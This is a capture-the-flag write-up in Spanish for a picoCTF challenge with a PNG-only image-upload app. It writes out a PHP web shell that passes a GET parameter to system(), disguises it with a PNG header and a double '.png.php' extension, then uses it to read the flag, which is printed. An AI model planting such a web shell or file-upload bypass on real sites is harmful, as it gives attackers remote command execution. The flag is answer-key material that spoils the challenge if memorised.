## Descripción

I found a web app that can help process images: PNG images only!
Try it [here](http://atlas.picoctf.net:59606/)!
## Pistas

1. (None)

## Solución

1. `Accedemos a la terminal del kali y creamos un archivo para cargarlo de PNG`

```
┌──(kali㉿kali)-[~]
└─$ nano webshell.php

PNG
<?php
if(isset($_GET['cmd'])){
	echo "<pre>";
        system($_GET['cmd']);
        echo "<pre>";
}
?>
```

2. `Guardaremos el archivo` 

`cp webshell.php webshell.png.php`

3. `Subimos el archivo en http://atlas.picoctf.net:59606, recargamos y nos saldrá`

`PNG`

`GAZWIMLEGU2DQ.txt`
`index.php`
`instructions.txt`
`robots.txt`
`uploads`

4. `Accedemos al archivo con la siguiente URL`
`http://atlas.picoctf.net:59606/uploads/webshell.png.php?cmd=cat%20../GAZWIMLEGU2DQ.txt`


`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}`

## Notas Adicionales



## Referencias
- 

